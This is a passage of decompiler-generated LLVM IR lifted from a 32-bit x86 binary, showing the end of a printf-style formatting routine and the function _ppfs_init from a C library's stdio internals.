  br i1 %v1_804ac51, label %dec_label_pc_804ac67, label %dec_label_pc_804ac55

dec_label_pc_804ac55:                             ; preds = %dec_label_pc_804ac4f
  %v2_804ac55 = add i32 %v0_804ac3a, 12
  %v3_804ac55 = inttoptr i32 %v2_804ac55 to i32*
  store i32 0, i32* %v3_804ac55, align 4
  %v1_804ac56 = add i32 %v0_804ac3a, 384
  %v2_804ac56 = inttoptr i32 %v1_804ac56 to i32*
  %v3_804ac56 = load i32, i32* %v2_804ac56, align 4
  %v5_804ac56 = add i32 %v0_804ac3a, 8
  %v6_804ac56 = inttoptr i32 %v5_804ac56 to i32*
  store i32 %v3_804ac56, i32* %v6_804ac56, align 4
  %v0_804ac5d = load i32, i32* @esi, align 4
  %v2_804ac5d = add i32 %v0_804ac3a, 4
  %v3_804ac5d = inttoptr i32 %v2_804ac5d to i32*
  store i32 %v0_804ac5d, i32* %v3_804ac5d, align 4
  %v0_804ac5e = load i32, i32* @edi, align 4
  %v3_804ac5e = inttoptr i32 %v0_804ac3a to i32*
  store i32 %v0_804ac5e, i32* %v3_804ac5e, align 4
  %v0_804ac5f = load i32, i32* %stack_var_-364, align 4
  %v4_804ac5f = call i32 @__stdio_fwrite(i32 %v0_804ac5f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ac5f, i32* %eax.global-to-local, align 4
  %v0_804ac64 = load i32, i32* @esp, align 4
  %v1_804ac64 = add i32 %v0_804ac64, 16
  %v7_804ac64 = icmp slt i32 %v1_804ac64, 0
  store i1 %v7_804ac64, i1* %sf.global-to-local, align 1
  %v1_804ac67.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ac67

dec_label_pc_804ac67:                             ; preds = %dec_label_pc_804ac4f, %dec_label_pc_804ac55
  %v0_804acd146 = phi i32 [ %v1_804ac3a, %dec_label_pc_804ac4f ], [ %v1_804ac64, %dec_label_pc_804ac55 ]
  %v1_804ac67 = phi i32 [ 0, %dec_label_pc_804ac4f ], [ %v1_804ac67.pre, %dec_label_pc_804ac55 ]
  %v0_804ac67 = phi i32 [ 0, %dec_label_pc_804ac4f ], [ %v4_804ac5f, %dec_label_pc_804ac55 ]
  %v2_804ac67 = sub i32 %v0_804ac67, %v1_804ac67
  %v12_804ac67 = icmp eq i32 %v2_804ac67, 0
  %v13_804ac67 = icmp slt i32 %v2_804ac67, 0
  store i1 %v13_804ac67, i1* %sf.global-to-local, align 1
  %v1_804ac69 = icmp eq i1 %v12_804ac67, false
  br i1 %v1_804ac69, label %dec_label_pc_804acff, label %dec_label_pc_804acd1

dec_label_pc_804ac71:                             ; preds = %dec_label_pc_804ac45
  %v1_804ac71 = add i32 %v0_804ac3a, 348
  %v2_804ac71 = inttoptr i32 %v1_804ac71 to i32*
  store i32 0, i32* %v2_804ac71, align 4
  %v0_804accd8 = load i32, i32* @esi, align 4
  %v1_804accd9 = icmp eq i32 %v0_804accd8, 0
  %v2_804accd10 = icmp slt i32 %v0_804accd8, 0
  store i1 %v2_804accd10, i1* %sf.global-to-local, align 1
  %v1_804accf16 = icmp eq i1 %v1_804accd9, false
  %v0_804ac7e.pre = load i32, i32* @esp, align 4
  br i1 %v1_804accf16, label %dec_label_pc_804ac7e, label %dec_label_pc_804acd1

dec_label_pc_804ac7e:                             ; preds = %dec_label_pc_804ac71, %dec_label_pc_804accb
  %v0_804ac85 = phi i32 [ %v2_804accb, %dec_label_pc_804accb ], [ %v0_804accd8, %dec_label_pc_804ac71 ]
  %v1_804ac90 = phi i32 [ %v0_804ac7e41, %dec_label_pc_804accb ], [ %v0_804ac7e.pre, %dec_label_pc_804ac71 ]
  %v1_804ac7e = add i32 %v1_804ac90, 332
  store i32 %v1_804ac7e, i32* %edx.global-to-local, align 4
  %v1_804ac85 = add i32 %v0_804ac85, -128
  %v2_804ac85 = icmp ult i32 %v0_804ac85, 128
  %v6_804ac85 = icmp eq i32 %v1_804ac85, 0
  %v7_804ac85 = icmp slt i32 %v1_804ac85, 0
  store i1 %v7_804ac85, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804ac90 = add i32 %v1_804ac90, -4
  %v3_804ac90 = inttoptr i32 %v2_804ac90 to i32*
  store i32 %v1_804ac7e, i32* %v3_804ac90, align 4
  %v2_804ac91 = or i1 %v2_804ac85, %v6_804ac85
  %v3_804ac91 = load i32, i32* %eax.global-to-local, align 4
  %v4_804ac91 = load i32, i32* @esi, align 4
  %v5_804ac91 = select i1 %v2_804ac91, i32 %v4_804ac91, i32 %v3_804ac91
  %v2_804ac94 = add i32 %v1_804ac90, -8
  %v3_804ac94 = inttoptr i32 %v2_804ac94 to i32*
  store i32 %v5_804ac91, i32* %v3_804ac94, align 4
  %v1_804ac95 = add i32 %v1_804ac90, 340
  store i32 %v1_804ac95, i32* %eax.global-to-local, align 4
  %v2_804ac9c = add i32 %v1_804ac90, -12
  %v3_804ac9c = inttoptr i32 %v2_804ac9c to i32*
  store i32 %v1_804ac95, i32* %v3_804ac9c, align 4
  %v1_804ac9d = add i32 %v1_804ac90, 204
  store i32 %v1_804ac9d, i32* @edi, align 4
  %v2_804aca4 = add i32 %v1_804ac90, -16
  %v3_804aca4 = inttoptr i32 %v2_804aca4 to i32*
  store i32 %v1_804ac9d, i32* %v3_804aca4, align 4
  %v0_804aca5 = call i32 @__GI_wcsrtombs()
  %v0_804acaa = load i32, i32* @esp, align 4
  %v1_804acaa = add i32 %v0_804acaa, 16
  store i32 %v0_804aca5, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804acb1 = icmp eq i32 %v0_804aca5, 0
  %v2_804acb1 = icmp slt i32 %v0_804aca5, 0
  store i1 %v2_804acb1, i1* %sf.global-to-local, align 1
  br i1 %v1_804acb1, label %dec_label_pc_804acc7, label %dec_label_pc_804acb5

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804ac7e
  %v0_804acb5 = load i32, i32* @ebp, align 4
  %v2_804acb5 = add i32 %v0_804acaa, 12
  %v3_804acb5 = inttoptr i32 %v2_804acb5 to i32*
  store i32 %v0_804acb5, i32* %v3_804acb5, align 4
  %v1_804acb6 = add i32 %v0_804acaa, 384
  %v2_804acb6 = inttoptr i32 %v1_804acb6 to i32*
  %v3_804acb6 = load i32, i32* %v2_804acb6, align 4
  %v5_804acb6 = add i32 %v0_804acaa, 8
  %v6_804acb6 = inttoptr i32 %v5_804acb6 to i32*
  store i32 %v3_804acb6, i32* %v6_804acb6, align 4
  %v2_804acbd = add i32 %v0_804acaa, 4
  %v3_804acbd = inttoptr i32 %v2_804acbd to i32*
  store i32 %v0_804aca5, i32* %v3_804acbd, align 4
  %v0_804acbe = load i32, i32* @edi, align 4
  %v3_804acbe = inttoptr i32 %v0_804acaa to i32*
  store i32 %v0_804acbe, i32* %v3_804acbe, align 4
  %v0_804acbf = load i32, i32* %stack_var_-364, align 4
  %v4_804acbf = call i32 @__stdio_fwrite(i32 %v0_804acbf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804acbf, i32* %eax.global-to-local, align 4
  %v0_804acc4 = load i32, i32* @esp, align 4
  %v1_804acc4 = add i32 %v0_804acc4, 16
  %v7_804acc4 = icmp slt i32 %v1_804acc4, 0
  store i1 %v7_804acc4, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804acc7

dec_label_pc_804acc7:                             ; preds = %dec_label_pc_804ac7e, %dec_label_pc_804acb5
  %v1_804accb = phi i32 [ 0, %dec_label_pc_804ac7e ], [ %v4_804acbf, %dec_label_pc_804acb5 ]
  %v0_804ac7e41 = phi i32 [ %v1_804acaa, %dec_label_pc_804ac7e ], [ %v1_804acc4, %dec_label_pc_804acb5 ]
  %v2_804acc7 = sub i32 %v1_804accb, %v0_804aca5
  %v12_804acc7 = icmp eq i32 %v2_804acc7, 0
  %v13_804acc7 = icmp slt i32 %v2_804acc7, 0
  store i1 %v13_804acc7, i1* %sf.global-to-local, align 1
  %v1_804acc9 = icmp eq i1 %v12_804acc7, false
  br i1 %v1_804acc9, label %dec_label_pc_804acff, label %dec_label_pc_804accb

dec_label_pc_804accb:                             ; preds = %dec_label_pc_804acc7
  %v0_804accb = load i32, i32* @esi, align 4
  %v2_804accb = sub i32 %v0_804accb, %v1_804accb
  %v12_804accb = icmp eq i32 %v2_804accb, 0
  %v13_804accb = icmp slt i32 %v2_804accb, 0
  store i32 %v2_804accb, i32* @esi, align 4
  store i1 %v13_804accb, i1* %sf.global-to-local, align 1
  %v1_804accf = icmp eq i1 %v12_804accb, false
  br i1 %v1_804accf, label %dec_label_pc_804ac7e, label %dec_label_pc_804acd1

dec_label_pc_804acd1:                             ; preds = %dec_label_pc_804accb, %dec_label_pc_804ac71, %dec_label_pc_804ac67
  %v0_804acd1 = phi i32 [ %v0_804acd146, %dec_label_pc_804ac67 ], [ %v0_804ac7e.pre, %dec_label_pc_804ac71 ], [ %v0_804ac7e41, %dec_label_pc_804accb ]
  %v1_804acd1 = add i32 %v0_804acd1, 8
  %v2_804acd1 = inttoptr i32 %v1_804acd1 to i32*
  %v3_804acd1 = load i32, i32* %v2_804acd1, align 4
  store i32 %v3_804acd1, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804acda = add i32 %v0_804acd1, 368
  %v2_804acda = inttoptr i32 %v1_804acda to i32*
  %v3_804acda = load i32, i32* %v2_804acda, align 4
  store i32 %v3_804acda, i32* @eax, align 4
  %v0_804ace1 = call i32 @_charpad()
  store i32 %v0_804ace1, i32* %eax.global-to-local, align 4
  %v1_804ace6 = load i32, i32* @esp, align 4
  %v2_804ace6 = add i32 %v1_804ace6, 8
  %v3_804ace6 = inttoptr i32 %v2_804ace6 to i32*
  %v4_804ace6 = load i32, i32* %v3_804ace6, align 4
  %v5_804ace6 = sub i32 %v0_804ace1, %v4_804ace6
  %v15_804ace6 = icmp eq i32 %v5_804ace6, 0
  %v16_804ace6 = icmp slt i32 %v5_804ace6, 0
  store i1 %v16_804ace6, i1* %sf.global-to-local, align 1
  %v1_804acea = icmp eq i1 %v15_804ace6, false
  br i1 %v1_804acea, label %dec_label_pc_804acff, label %dec_label_pc_804acec

dec_label_pc_804acec:                             ; preds = %dec_label_pc_804acd1, %dec_label_pc_804aa59, %dec_label_pc_804a884
  %v0_804acec = phi i32 [ %v1_804ace6, %dec_label_pc_804acd1 ], [ %v0_804acec.pre, %dec_label_pc_804aa59 ], [ %v1_804a8a2, %dec_label_pc_804a884 ]
  %v1_804acec = add i32 %v0_804acec, 16
  %v2_804acec = inttoptr i32 %v1_804acec to i32*
  %v3_804acec = load i32, i32* %v2_804acec, align 4
  store i32 %v3_804acec, i32* @ebx, align 4
  store i32 %v3_804acec, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a7dc.backedge

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804a81a
  %v1_804acf7 = add i32 %v0_804acf7, 2
  %v10_804acf7 = icmp slt i32 %v1_804acf7, 0
  store i1 %v10_804acf7, i1* %sf.global-to-local, align 1
  store i32 %v1_804acf7, i32* @ebx, align 4
  br label %dec_label_pc_804a7dc.backedge

dec_label_pc_804acff:                             ; preds = %dec_label_pc_804a806, %dec_label_pc_804acd1, %dec_label_pc_804ac67, %dec_label_pc_804ac12, %dec_label_pc_804abeb, %dec_label_pc_804ab5b, %dec_label_pc_804aace, %dec_label_pc_804aa8f, %dec_label_pc_804aa30, %dec_label_pc_804acc7
  %v0_804acff = phi i32 [ %v0_804ac7e41, %dec_label_pc_804acc7 ], [ %v0_804acff.pre.pre, %dec_label_pc_804a806 ], [ %v1_804ace6, %dec_label_pc_804acd1 ], [ %v0_804acd146, %dec_label_pc_804ac67 ], [ %v1_804ac3a, %dec_label_pc_804ac12 ], [ %v1_804ac00, %dec_label_pc_804abeb ], [ %v0_804a87c.lcssa, %dec_label_pc_804ab5b ], [ %v1_804aae6, %dec_label_pc_804aace ], [ %v1_804aab2, %dec_label_pc_804aa8f ], [ %v1_804aa4e, %dec_label_pc_804aa30 ]
  %v1_804acff = inttoptr i32 %v0_804acff to i32*
  store i32 -1, i32* %v1_804acff, align 4
  br label %dec_label_pc_804ad06

dec_label_pc_804ad06:                             ; preds = %dec_label_pc_804a811, %dec_label_pc_804a77f, %dec_label_pc_804a79e, %dec_label_pc_804acff
  %v0_804ad06 = load i32, i32* @esp, align 4
  %v1_804ad06 = inttoptr i32 %v0_804ad06 to i32*
  %v2_804ad06 = load i32, i32* %v1_804ad06, align 4
  store i32 %v2_804ad06, i32* %eax.global-to-local, align 4
  %v1_804ad09 = add i32 %v0_804ad06, 348
  %v10_804ad09 = icmp slt i32 %v1_804ad09, 0
  store i1 %v10_804ad09, i1* %sf.global-to-local, align 1
  ret i32 %v2_804ad06

; uselistorder directives
  uselistorder i32 %v1_804acf7, { 1, 2, 0 }
  uselistorder i32 %v3_804acec, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804acd1, { 1, 0 }
  uselistorder i32 %v2_804accb, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804acaa, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804aca5, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804ac85, { 1, 0 }
  uselistorder i32 %v0_804ac7e.pre, { 1, 0 }
  uselistorder i32 %v0_804ac51, { 1, 0 }
  uselistorder i32 %v3_804ac45, { 1, 0 }
  uselistorder i32 %v0_804ac3a, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804ac12, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804abeb, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804abd3, { 1, 0 }
  uselistorder i32 %v2_804abbf, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804abac, { 1, 0 }
  uselistorder i32 %v1_804aba9, { 1, 0 }
  uselistorder i32 %v1_804ab9f, { 1, 0 }
  uselistorder i32 %v0_804ab9f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ab7e, { 1, 0 }
  uselistorder i32 %v1_804ab5b, { 1, 0 }
  uselistorder i32 %v1_804ab19, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804ab35, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804aafe, { 1, 0 }
  uselistorder i32 %v1_804aae9, { 1, 0 }
  uselistorder i32 %v1_804aab5, { 1, 0 }
  uselistorder i32 %v0_804aa8f, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804aa75, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804aa61, { 1, 0 }
  uselistorder i32 %v1_804aa17, { 1, 0 }
  uselistorder i32 %v4_804a9e5, { 1, 0 }
  uselistorder i32 %v0_804a9da, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804a9d5, { 1, 0 }
  uselistorder i32 %v0_804aa0e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804a9c5, { 1, 0 }
  uselistorder i32 %v1_804a9bc, { 1, 0 }
  uselistorder i32 %v1_804a9b0, { 1, 0 }
  uselistorder i32 %v3_804a9a4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804a99a, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804a995, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804a993, { 1, 0 }
  uselistorder i32 %v0_804a9e5, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804a9d5, { 1, 2, 0 }
  uselistorder i32 %v3_804a96d, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804a95b, { 1, 0 }
  uselistorder i32 %v4_804a952, { 1, 0 }
  uselistorder i32 %v3_804a952, { 1, 0 }
  uselistorder i32 %v6_804a94a, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804a91b, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804a91a, { 2, 1, 0 }
  uselistorder i32 %v1_804a8f3, { 1, 0 }
  uselistorder i32 %v1_804a8e7, { 1, 0 }
  uselistorder i32 %v1_804a8e2, { 1, 0 }
  uselistorder i32 %v2_804a8da, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_804a8c4, { 1, 0, 2 }
  uselistorder i8 %v3_804a8b3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a8aa, { 1, 0 }
  uselistorder i32 %v3_804a87c, { 8, 7, 16, 5, 6, 14, 15, 4, 3, 13, 12, 9, 0, 1, 2, 10, 11, 17, 18, 19 }
  uselistorder i32 %v0_804a87c.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804a878, { 1, 0 }
  uselistorder i32 %v1_804a878.pre, { 1, 0 }
  uselistorder i32 %v1_804a877, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804a874, { 1, 0 }
  uselistorder i32 %v2_804a87872, { 1, 0 }
  uselistorder i32 %v3_804a85e, { 1, 0 }
  uselistorder i8 %v4_804a81a, { 1, 0 }
  uselistorder i32 %v1_804a81a, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804a811, { 1, 0 }
  uselistorder i32 %v2_804a7e6, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804a7e2, { 1, 0 }
  uselistorder i8 %v2_804a7dc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a7ea, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804a7cc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 5, 0, 7, 6, 1, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 72, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 89, 90, 88, 91, 92, 93, 94, 70, 71 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 0, 1, 2, 54, 55, 56, 57, 58, 60, 59, 61, 62, 63, 47 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ad06, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804acff, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804acc7, { 1, 0 }
  uselistorder label %dec_label_pc_804ac7e, { 1, 0 }
  uselistorder label %dec_label_pc_804ac67, { 1, 0 }
  uselistorder label %dec_label_pc_804ac12, { 1, 0 }
  uselistorder label %dec_label_pc_804abe4, { 1, 0 }
  uselistorder label %dec_label_pc_804abc9, { 1, 0 }
  uselistorder label %dec_label_pc_804abb3, { 1, 0 }
  uselistorder label %dec_label_pc_804ab9f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ab9a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_804ab12, { 1, 0 }
  uselistorder label %dec_label_pc_804aa30, { 1, 0 }
  uselistorder label %dec_label_pc_804a9d5, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804a983, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a933, { 1, 0 }
  uselistorder label %dec_label_pc_804a91a, { 1, 0 }
  uselistorder label %dec_label_pc_804a906, { 1, 0 }
  uselistorder label %dec_label_pc_804a901, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a8e2, { 1, 0 }
  uselistorder label %dec_label_pc_804a86d, { 1, 0 }
  uselistorder label %dec_label_pc_804a865, { 1, 0 }
  uselistorder label %dec_label_pc_804a811, { 1, 0 }
  uselistorder label %dec_label_pc_804a806, { 1, 0 }
  uselistorder label %dec_label_pc_804a7dc.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ad14 = load i32, i32* @esi, align 4
  %v0_804ad15 = load i32, i32* @ebx, align 4
  store i32 %v0_804ad15, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ad29 = bitcast i32* %arg1 to i8*
  %v4_804ad29 = call i32 @__GI_memset(i8* %v3_804ad29, i32 0, i32 188)
  %v0_804ad2e = load i32, i32* @ebx, align 4
  %v1_804ad2e = add i32 %v0_804ad2e, 40
  store i32 %v1_804ad2e, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804ad36 = add i32 %v0_804ad2e, 24
  %v2_804ad36 = inttoptr i32 %v1_804ad36 to i32*
  %v3_804ad36 = load i32, i32* %v2_804ad36, align 4
  %v4_804ad36 = add i32 %v3_804ad36, -1
  store i32 %v4_804ad36, i32* %v2_804ad36, align 4
  %v0_804ad3c = load i32, i32* @esi, align 4
  %v1_804ad3c = load i32, i32* @ebx, align 4
  %v2_804ad3c = inttoptr i32 %v1_804ad3c to i32*
  store i32 %v0_804ad3c, i32* %v2_804ad3c, align 4
  %v0_804ad3e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad3e

dec_label_pc_804ad3e:                             ; preds = %dec_label_pc_804ad3e, %entry
  %v0_804ad3e = phi i32 [ %v1_804ad44, %dec_label_pc_804ad3e ], [ %v0_804ad3e.pre, %entry ]
  %v1_804ad3e = inttoptr i32 %v0_804ad3e to i32*
  store i32 8, i32* %v1_804ad3e, align 4
  %v0_804ad44 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad44 = add i32 %v0_804ad44, 4
  store i32 %v1_804ad44, i32* %eax.global-to-local, align 4
  %v0_804ad47 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ad47 = add i32 %v0_804ad47, -1
  %v8_804ad47 = icmp eq i32 %v1_804ad47, 0
  store i32 %v1_804ad47, i32* %edx.global-to-local, align 4
  %v1_804ad48 = icmp eq i1 %v8_804ad47, false
  br i1 %v1_804ad48, label %dec_label_pc_804ad3e, label %dec_label_pc_804ad4a

dec_label_pc_804ad4a:                             ; preds = %dec_label_pc_804ad3e
  %v0_804ad4a = load i32, i32* @esi, align 4
  store i32 %v0_804ad4a, i32* %eax.global-to-local, align 4
  %v1_804ad7520 = inttoptr i32 %v0_804ad4a to i8*
  %v2_804ad7521 = load i8, i8* %v1_804ad7520, align 1
  %v3_804ad7522 = zext i8 %v2_804ad7521 to i32
  %v5_804ad7523 = and i32 %v1_804ad47, -256
  %v6_804ad7524 = or i32 %v3_804ad7522, %v5_804ad7523
  store i32 %v6_804ad7524, i32* %edx.global-to-local, align 4
  %v4_804ad7725 = icmp eq i8 %v2_804ad7521, 0
  %v1_804ad7927 = icmp eq i1 %v4_804ad7725, false
  br i1 %v1_804ad7927, label %dec_label_pc_804ad53, label %dec_label_pc_804ad7b

dec_label_pc_804ad53:                             ; preds = %dec_label_pc_804ad4a, %dec_label_pc_804ad75.backedge
  %v6_804ad7530 = phi i32 [ %v6_804ad75, %dec_label_pc_804ad75.backedge ], [ %v6_804ad7524, %dec_label_pc_804ad4a ]
  %v2_804ad7529 = phi i8 [ %v2_804ad75, %dec_label_pc_804ad75.backedge ], [ %v2_804ad7521, %dec_label_pc_804ad4a ]
  %v0_804ad5828 = phi i32 [ %v0_804ad58.be, %dec_label_pc_804ad75.backedge ], [ %v0_804ad4a, %dec_label_pc_804ad4a ]
  %v10_804ad53 = icmp eq i8 %v2_804ad7529, 37
  %v1_804ad56 = icmp eq i1 %v10_804ad53, false
  br i1 %v1_804ad56, label %dec_label_pc_804ad74, label %dec_label_pc_804ad58

dec_label_pc_804ad58:                             ; preds = %dec_label_pc_804ad53
  %v1_804ad58 = add i32 %v0_804ad5828, 1
  store i32 %v1_804ad58, i32* %eax.global-to-local, align 4
  %v1_804ad59 = inttoptr i32 %v1_804ad58 to i8*
  %v2_804ad59 = load i8, i8* %v1_804ad59, align 1
  %v11_804ad59 = icmp eq i8 %v2_804ad59, 37
  br i1 %v11_804ad59, label %dec_label_pc_804ad74, label %dec_label_pc_804ad5e

dec_label_pc_804ad5e:                             ; preds = %dec_label_pc_804ad58
  %v1_804ad61 = load i32, i32* @ebx, align 4
  %v2_804ad61 = inttoptr i32 %v1_804ad61 to i32*
  store i32 %v1_804ad58, i32* %v2_804ad61, align 4
  %v0_804ad63 = load i32, i32* @ebx, align 4
  %v1_804ad64 = inttoptr i32 %v0_804ad63 to i32*
  %v2_804ad64 = call i32 @_ppfs_parsespec(i32* %v1_804ad64)
  store i32 %v2_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ad6c = icmp slt i32 %v2_804ad64, 0
  br i1 %v2_804ad6c, label %dec_label_pc_804ad7f, label %dec_label_pc_804ad70

dec_label_pc_804ad70:                             ; preds = %dec_label_pc_804ad5e
  %v0_804ad70 = load i32, i32* @ebx, align 4
  %v1_804ad70 = inttoptr i32 %v0_804ad70 to i32*
  %v2_804ad70 = load i32, i32* %v1_804ad70, align 4
  %v4_804ad75.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad75.backedge

dec_label_pc_804ad74:                             ; preds = %dec_label_pc_804ad58, %dec_label_pc_804ad53
  %v0_804ad74 = phi i32 [ %v1_804ad58, %dec_label_pc_804ad58 ], [ %v0_804ad5828, %dec_label_pc_804ad53 ]
  %v1_804ad74 = add i32 %v0_804ad74, 1
  br label %dec_label_pc_804ad75.backedge

dec_label_pc_804ad75.backedge:                    ; preds = %dec_label_pc_804ad74, %dec_label_pc_804ad70
  %v4_804ad75.be = phi i32 [ %v4_804ad75.pre.pre, %dec_label_pc_804ad70 ], [ %v6_804ad7530, %dec_label_pc_804ad74 ]
  %v0_804ad58.be = phi i32 [ %v2_804ad70, %dec_label_pc_804ad70 ], [ %v1_804ad74, %dec_label_pc_804ad74 ]
  store i32 %v0_804ad58.be, i32* %eax.global-to-local, align 4
  %v1_804ad75 = inttoptr i32 %v0_804ad58.be to i8*
  %v2_804ad75 = load i8, i8* %v1_804ad75, align 1
  %v3_804ad75 = zext i8 %v2_804ad75 to i32
  %v5_804ad75 = and i32 %v4_804ad75.be, -256
  %v6_804ad75 = or i32 %v3_804ad75, %v5_804ad75
  store i32 %v6_804ad75, i32* %edx.global-to-local, align 4
  %v4_804ad77 = icmp eq i8 %v2_804ad75, 0
  %v1_804ad79 = icmp eq i1 %v4_804ad77, false
  br i1 %v1_804ad79, label %dec_label_pc_804ad53, label %dec_label_pc_804ad75.dec_label_pc_804ad7b_crit_edge

dec_label_pc_804ad75.dec_label_pc_804ad7b_crit_edge: ; preds = %dec_label_pc_804ad75.backedge
  %v0_804ad7b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ad7b

dec_label_pc_804ad7b:                             ; preds = %dec_label_pc_804ad75.dec_label_pc_804ad7b_crit_edge, %dec_label_pc_804ad4a
  %v0_804ad7b = phi i32 [ %v0_804ad7b.pre, %dec_label_pc_804ad75.dec_label_pc_804ad7b_crit_edge ], [ %v0_804ad4a, %dec_label_pc_804ad4a ]
  %v1_804ad7b = load i32, i32* @ebx, align 4
  %v2_804ad7b = inttoptr i32 %v1_804ad7b to i32*
  store i32 %v0_804ad7b, i32* %v2_804ad7b, align 4
  br label %dec_label_pc_804ad7f

dec_label_pc_804ad7f:                             ; preds = %dec_label_pc_804ad5e, %dec_label_pc_804ad7b
  %storemerge = phi i32 [ 0, %dec_label_pc_804ad7b ], [ -1, %dec_label_pc_804ad5e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804ad7f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ad7f, i32* @edx, align 4
  %v2_804ad80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ad80, i32* @ebx, align 4
  store i32 %v0_804ad14, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804ad75, { 1, 0 }
  uselistorder i8 %v2_804ad75, { 1, 2, 0 }
  uselistorder i32 %v0_804ad58.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ad5828, { 1, 0 }
